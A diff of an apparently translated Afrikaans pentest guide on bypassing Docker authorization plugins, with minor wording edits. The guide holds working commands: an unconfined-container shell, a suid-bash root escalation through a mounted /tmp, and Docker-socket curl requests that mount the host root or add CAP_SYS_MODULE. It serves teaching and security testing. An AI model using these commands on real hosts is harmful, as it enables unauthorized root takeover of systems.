@@ -1,10 +1,10 @@
 {{#include ../../../banners/hacktricks-training.md}}
 
-**Docker** se standaard **autorisatiemodel** is **alles of niks**. Enige gebruiker met toestemming om toegang tot die Docker daemon te verkry, kan **enige** Docker kliënt **opdrag** uitvoer. Dieselfde geld vir oproepers wat Docker se Engine API gebruik om met die daemon te kommunikeer. As jy **groter toegangbeheer** benodig, kan jy **autorisasie plugins** skep en dit by jou Docker daemon konfigurasie voeg. Met 'n autorisasie plugin kan 'n Docker administrateur **fyn toegang** beleid konfigureer om toegang tot die Docker daemon te bestuur.
+**Docker** se standaard **autorisatiemodel** is **alles of niks**. Enige gebruiker met toestemming om toegang tot die Docker daemon te verkry, kan **enige** Docker kliënt **opdrag** uitvoer. Dieselfde geld vir oproepers wat Docker se Engine API gebruik om die daemon te kontak. As jy **groter toegangbeheer** benodig, kan jy **autorisasie plugins** skep en dit by jou Docker daemon konfigurasie voeg. Met 'n autorisasie plugin kan 'n Docker administrateur **fyn toegang** beleid konfigureer om toegang tot die Docker daemon te bestuur.
 
 # Basiese argitektuur
 
-Docker Auth plugins is **eksterne** **plugins** wat jy kan gebruik om **toestemming/ontkenning** van **aksies** wat aan die Docker Daemon **gevra** word, te **afhang** van die **gebruiker** wat dit gevra het en die **aksie** **gevra**.
+Docker Auth plugins is **eksterne** **plugins** wat jy kan gebruik om **aksies** wat aan die Docker Daemon **gevra** word, te **toelaat/ontken** **afhangende** van die **gebruiker** wat dit gevra het en die **aksie** **gevra**.
 
 **[Die volgende inligting is uit die dokumentasie](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
@@ -42,13 +42,13 @@ Jy kan 'n **maklik verstaanbare plugin** met gedetailleerde inligting oor instal
 
 Lees die `README` en die `plugin.go` kode om te verstaan hoe dit werk.
 
-# Docker Auth Plugin Omseiling
+# Docker Auth Plugin Bypass
 
-## Toegang op te som
+## Enumereer toegang
 
 Die belangrikste dinge om te kontroleer is die **watter eindpunte toegelaat word** en **watter waardes van HostConfig toegelaat word**.
 
-Om hierdie opsomming te doen, kan jy **die hulpmiddel** [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**.**
+Om hierdie enumerasie uit te voer, kan jy die **instrument** [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**.**
 
 ## verbode `run --privileged`
 
@@ -64,7 +64,7 @@ docker run -d --privileged modified-ubuntu
 docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
 See 'docker run --help'.
 ```
-'n Gebruiker kan egter **'n skulp binne die lopende houer skep en dit die ekstra voorregte gee**:
+egter, 'n gebruiker kan **'n skulp binne die lopende houer skep en dit die ekstra voorregte gee**:
 ```bash
 docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
 #bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
@@ -80,7 +80,7 @@ Nou kan die gebruiker uit die houer ontsnap deur enige van die [**voorheen bespr
 
 ## Monteer Skryfbare Gids
 
-In hierdie geval het die stelselsadministrateur **gebruikers verbied om houers met die `--privileged` vlag te laat loop** of enige ekstra vermoë aan die houer te gee, en hy het slegs toegelaat om die `/tmp` gids te monteer:
+In hierdie geval het die stelselaanvaarder **gebruikers verbied om houers met die `--privileged` vlag te laat loop** of enige ekstra vermoë aan die houer te gee, en hy het slegs toegelaat om die `/tmp` gids te monteer:
 ```bash
 host> cp /bin/bash /tmp #Cerate a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
@@ -90,15 +90,15 @@ host> /tmp/bash
 -p #This will give you a shell as root
 ```
 > [!NOTE]
-> Let daarop dat jy dalk nie die gids `/tmp` kan monteer nie, maar jy kan 'n **ander skryfbare gids** monteer. Jy kan skryfbare gidse vind met: `find / -writable -type d 2>/dev/null`
+> Let daarop dat jy dalk nie die gids `/tmp` kan monteer nie, maar jy kan 'n **ander skryfbare gids** monteer. Jy kan skryfbare direkteure vind met: `find / -writable -type d 2>/dev/null`
 >
-> **Let daarop dat nie al die gidse in 'n linux masjien die suid bit sal ondersteun nie!** Om te kontroleer watter gidse die suid bit ondersteun, voer `mount | grep -v "nosuid"` uit. Byvoorbeeld, gewoonlik ondersteun `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` en `/var/lib/lxcfs` nie die suid bit nie.
+> **Let daarop dat nie al die direkteure in 'n linux masjien die suid bit sal ondersteun nie!** Om te kontroleer watter direkteure die suid bit ondersteun, voer `mount | grep -v "nosuid"` uit. Byvoorbeeld, gewoonlik ondersteun `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` en `/var/lib/lxcfs` nie die suid bit nie.
 >
-> Let ook daarop dat as jy **`/etc`** of enige ander gids **wat konfigurasie lêers bevat**, kan **monteer**, jy dit as root vanuit die docker houer kan verander om dit te **misbruik in die gasheer** en voorregte te verhoog (miskien deur `/etc/shadow` te wysig).
+> Let ook daarop dat as jy **`/etc`** of enige ander gids **wat konfigurasie lêers bevat**, kan **monteer**, jy dit as root vanuit die docker container kan verander om dit te **misbruik in die gasheer** en voorregte te verhoog (miskien deur `/etc/shadow` te wysig).
 
 ## Ongekontroleerde API Eindpunt
 
-Die verantwoordelikheid van die sysadmin wat hierdie plugin konfigureer, sal wees om te beheer watter aksies en met watter voorregte elke gebruiker kan uitvoer. Daarom, as die admin 'n **swartlys** benadering met die eindpunte en die eienskappe neem, mag hy dalk **van sommige daarvan vergeet** wat 'n aanvaller in staat kan stel om **voorregte te verhoog.**
+Die verantwoordelikheid van die sysadmin wat hierdie plugin konfigureer, sal wees om te beheer watter aksies en met watter voorregte elke gebruiker kan uitvoer. Daarom, as die admin 'n **swartlys** benadering met die eindpunte en die eienskappe neem, mag hy dalk **sommige daarvan vergeet** wat 'n aanvaller kan toelaat om **voorregte te verhoog.**
 
 Jy kan die docker API nagaan in [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)
 
@@ -106,8 +106,8 @@ Jy kan die docker API nagaan in [https://docs.docker.com/engine/api/v1.40/#](htt
 
 ### Bindings in root
 
-Dit is moontlik dat toe die sysadmin die docker vuurmuur gekonfigureer het, hy **van 'n belangrike parameter** van die [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) soos "**Bindings**" **vergeet het**.\
-In die volgende voorbeeld is dit moontlik om hierdie miskonfigurasie te misbruik om 'n houer te skep en te laat loop wat die root (/) gids van die gasheer monteer:
+Dit is moontlik dat toe die sysadmin die docker vuurmuur gekonfigureer het, hy **'n paar belangrike parameters** van die [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) soos "**Bindings**" **vergeet het**.\
+In die volgende voorbeeld is dit moontlik om hierdie miskonfigurasie te misbruik om 'n container te skep en te laat loop wat die root (/) gids van die gasheer monteer:
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
 docker images #List the images available
@@ -128,7 +128,7 @@ curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '
 ```
 ### Mounts in root
 
-Volg dieselfde instruksies as met **Binds in root** deur hierdie **request** na die Docker API te doen:
+Volg dieselfde instruksies as met **Binds in root** deur hierdie **versoek** na die Docker API te doen:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
 ```
@@ -138,9 +138,9 @@ Volg dieselfde instruksies as met **Binds in root** deur hierdie **versoek** aan
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
 ```
-## Ongeëvalueerde JSON Kenmerk
+## Ongeëvalueerde JSON Attribuut
 
-Dit is moontlik dat toe die stelselsbestuurder die docker-vuurmuur gekonfigureer het, hy **vergeet het van 'n belangrike kenmerk van 'n parameter** van die [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) soos "**Capabilities**" binne "**HostConfig**". In die volgende voorbeeld is dit moontlik om hierdie miskonfigurasie te misbruik om 'n houer met die **SYS_MODULE** vermoë te skep en te laat loop:
+Dit is moontlik dat toe die stelselaanvoerder die docker-vuurmuur gekonfigureer het, hy **'n belangrike attribuut van 'n parameter** van die [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) soos "**Capabilities**" binne "**HostConfig**" **vergeet het**. In die volgende voorbeeld is dit moontlik om hierdie miskonfigurasie te misbruik om 'n houer met die **SYS_MODULE** vermoë te skep en te laat loop:
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
